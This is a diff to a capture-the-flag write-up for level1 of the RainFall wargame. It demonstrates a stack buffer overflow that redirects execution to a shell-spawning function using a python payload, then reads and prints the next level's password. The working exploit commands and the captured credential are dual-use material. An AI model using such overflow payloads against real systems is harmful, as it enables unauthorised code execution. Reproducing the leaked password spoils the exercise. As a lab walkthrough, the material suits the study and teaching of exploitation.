@@ -40,5 +40,26 @@ level1
 	0x63413563 in ?? ()
 	```
 *	I found this [website](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) to get calculate the offset and it is `76`
-*	Now all we need to to is make a string of 76 characters and add the exploit after those
-*	
+*	Our exploit will be the usgin the run function.
+	```assembly
+	08048444 <run>:
+	```
+*	In many modern systems, including Intel x86 and x86_64 architectures, little-endian is the prevalent byte order. So we add `\x44\x84\x04\x08` in the end of the exploit.
+*	Let's try this, this time I use python to make this more readable:
+	```console
+	level1@RainFall:~$ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
+	level1@RainFall:~$ cat /tmp/exploit | ./level1 
+	Good... Wait what?
+	Segmentation fault (core dumped)
+	```
+	Make sure to use `echo -e` if you don't use python print because the memory part won't be interpreted as binary data.
+*	The issue here is that the `/bin/sh` will shutdown because it is trying to read `STDIN`. We have to make sure cat, there is many ways to make sure it keeps reading 
+	```
+	level1@RainFall:~$ (cat /tmp/exploit; cat) | ./level1
+	level1@RainFall:~$ cat /tmp/exploit - | ./level1
+	Good... Wait what?
+	whoami
+	level2
+	cat /home/user/level2/.pass
+	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+	```
